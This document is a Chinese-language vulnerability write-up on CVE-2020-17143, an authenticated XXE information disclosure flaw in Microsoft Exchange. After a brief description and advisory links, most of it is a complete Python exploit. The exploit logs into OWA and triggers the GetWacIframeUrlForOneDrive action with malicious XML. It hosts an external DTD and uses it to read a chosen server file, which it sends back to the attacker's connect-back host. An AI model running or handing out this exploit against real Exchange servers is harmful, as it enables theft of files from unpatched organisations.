# Microsoft Exchange 信息泄露漏洞 CVE-2020-17143 

## 漏洞描述

此漏洞使远程攻击者可以披露有关受影响的Exchange Server安装的信息。利用身份验证才能利用此漏洞。

特定缺陷存在于GetWacIframeUrlForOneDrive服务命令的处理中。造成此问题的原因是缺乏对用户提供的xml的正确验证。攻击者可以利用此漏洞在SYSTEM上下文中披露信息。

Microsoft已发布更新来纠正此漏洞。可以在以下位置找到更多详细信息：https : //portal.msrc.microsoft.com/security-guidance/advisory/CVE-2020-17143

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2020-17143
- https://srcincite.io/advisories/src-2020-0030/

## 漏洞复现

exp：

```python
#!/usr/bin/env python3
import re
import sys
import urllib3
import requests
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xxe(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def _set_response(self, d):
        self.send_response(200)
        self.send_header('Content-type', 'application/xml')
        self.send_header('Content-Length', len(d))
        self.end_headers()
    def do_GET(self):
        if "leaked" in self.path:
            print("(+) stolen: %s" % self.path)
            message = "<![CDATA[ <![ INCLUDE[]]> ]]>"
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        elif "poc.dtd" in self.path:
            print("(+) triggered xxe in exchange server!")
            message = """
<!ENTITY %% payload "%%start;%%stuff;%%end;">
<!ENTITY %% param1 '<!ENTITY &#x25; external SYSTEM "http://%s:%d/leaked?%%payload;">'>
%%param1; %%external;""" % (host, int(port))
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        elif "poc.xml" in self.path:
            d = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY %% start "<![CDATA[">
 <!ENTITY %% stuff SYSTEM "file:///%s">
<!ENTITY %% end "]]>">
<!ENTITY %% dtd SYSTEM "http://%s:%d/poc.dtd">
%%dtd;
]>""" % (file, host, int(port))
            self._set_response(d)
            self.wfile.write(d.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        return

def main(t, usr, pwd, port):
    server = HTTPServer(('0.0.0.0', port), xxe)
    handlerthr = Thread(target=server.serve_forever, args=())
    handlerthr.daemon = True
    handlerthr.start()
    s = requests.Session()
    d = {
        "destination" : "https://%s/owa" % t,
        "flags" : "",
        "username" : usr,
        "password" : pwd
    }
    s.post("https://%s/owa/auth.owa" % t, data=d, verify=False)
    h = {
        "X-OWA-UrlPostData" : '{"request":{"DocumentUrl":"","EndPointUrl":"http://%s:%d/poc.xml"}}' % (host, port),
        "Action" : "GetWacIframeUrlForOneDrive"
    }
    r = s.post("https://%s/owa/service.svc" % t, headers=h, verify=False)
    assert s.cookies.get(name='X-OWA-CANARY') != None, "(-) couldn't leak the csrf canary!" 
    h["X-OWA-CANARY"] = s.cookies.get(name='X-OWA-CANARY')
    s.post("https://%s/owa/service.svc" % t, headers=h, verify=False)
    
if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("(+) usage: %s <target> <user:pass> <connectback ip:port> <file>" % sys.argv[0])
        print("(+) eg: %s 192.168.75.142 harryh@exchangedemo.com:user123# 192.168.75.1:9090 \"C:/Users/harryh/secrets.txt\"" % sys.argv[0])
        sys.exit(-1)
    trgt = sys.argv[1]
    assert ":" in sys.argv[2], "(-) you need a user and password!"
    usr = sys.argv[2].split(":")[0]
    pwd = sys.argv[2].split(":")[1]
    host = sys.argv[3]
    port = 9090
    file = sys.argv[4]
    if ":" in sys.argv[3]: 
        host = sys.argv[3].split(":")[0]
        port = sys.argv[3].split(":")[1]
        assert port.isdigit(), "(-) not a port number!"
    main(trgt, usr, pwd, int(port))
```

